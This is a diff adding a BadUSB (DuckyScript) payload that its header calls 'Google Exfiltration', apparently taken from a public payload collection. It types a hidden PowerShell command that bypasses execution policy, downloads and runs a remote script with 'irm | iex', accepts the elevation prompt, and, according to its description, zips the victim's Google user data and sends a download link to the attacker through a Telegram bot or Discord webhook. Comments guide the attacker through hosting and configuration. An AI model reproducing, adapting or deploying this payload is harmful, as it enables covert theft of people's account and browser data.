@@ -1,0 +1,30 @@
+REM Title: Google Exfiltration
+REM Author:	mrproxy
+REM Description: This payload runs powershell script that zip google user data, uses gofile.io api to upload it, and then sends download link through telegram bot or discord webhook.
+REM Target:	Windows 10, 11
+REM Version:	1.0
+REM Category:	Exfiltration
+REM Source: https://github.com/Mr-Proxy-source/BadUSB-Payloads
+
+REM Remember you will have to host the powershell script yourself on any file sharing service (it has to be direct download link)
+REM If you are using DropBox, just remember to change it from ?dl=0 top ?dl=1
+DEFINE #SCRIPT_URL example.com/payload.ps1?dl=1
+
+REM If you want to use discord webhook instead of telegram bot, just change DC_WEBHOOK 
+
+REM Telegram bot details
+DEFINE #BOT_TOKEN your-bot-token
+DEFINE #CHAT_ID your-chat-id
+
+REM Discord webhook
+DEFINE #DC_WEBHOOK your-webhook
+
+DELAY 1500
+GUI r
+DELAY 500
+REM If you want to use Telegram change just bot token and chat id
+REM If you want to use Discord Webhook dont do anything with botToken and chatID just change $webhook
+STRING powershell -w h -NoP -Ep Bypass -Command $botToken='#BOT_TOKEN'; $chatID='#CHAT_ID'; $webhook='#DC_WEBHOOK'; irm #SCRIPT_URL | iex
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
